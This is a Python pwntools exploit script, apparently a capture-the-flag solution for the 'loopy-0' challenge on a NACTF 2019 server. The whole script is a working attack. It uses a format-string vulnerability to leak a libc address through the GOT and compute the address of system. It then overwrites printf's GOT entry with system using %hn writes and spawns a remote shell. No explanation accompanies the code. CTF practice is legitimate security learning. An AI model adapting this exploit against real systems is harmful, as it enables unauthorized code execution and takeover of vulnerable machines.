from pwn import *

elf = ELF('../Files/loopy0/loopy-0')
libc = ELF('../Files/loopy0/libc.so.6')
r = remote('shell.2019.nactf.com', 31283)

r.recvuntil('>')

payload1 = p32(0x804c010) + "%4$s"
payload2 = p32(elf.symbols['main'])*4
payload = payload1.ljust(64) + payload2

r.sendline(payload)
r.recvuntil(': ')
r.recvn(4)

GETS_ADDR = u32(r.recvn(4))
LIBC_BASE = GETS_ADDR - libc.symbols['gets']
SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']
print("GETS: " + hex(GETS_ADDR))
print("LIBC: " + hex(LIBC_BASE))
print("SYSTEM: " + hex(SYSTEM_ADDR))

GOT_PRINTF = elf.got['printf']
GOT_PRINTF_LO = GOT_PRINTF
GOT_PRINTF_HI = GOT_PRINTF + 0x2

SYSTEM_ADDR_HI = SYSTEM_ADDR >> 16
SYSTEM_ADDR_LO = SYSTEM_ADDR - (SYSTEM_ADDR_HI << 16)

print("PRINTF GOT: " + hex(GOT_PRINTF))
print("SYSTEM_LO: " + hex(SYSTEM_ADDR_LO))
print("SYSTEM_HI: " + hex(SYSTEM_ADDR_HI))

p2 = SYSTEM_ADDR_LO
p1 = SYSTEM_ADDR_HI - p2

print(p1)
print(p2)

pad1 = "%" + str(p1) + "x"
pad2 = "%" + str(p2) + "x"

payload1 = pad2 + "%21$hn" + pad1 + "%20$hn;sh"
payload = payload1.ljust(64) + p32(GOT_PRINTF_HI) +  p32(GOT_PRINTF_LO) + payload2
r.sendline(payload)

r.interactive()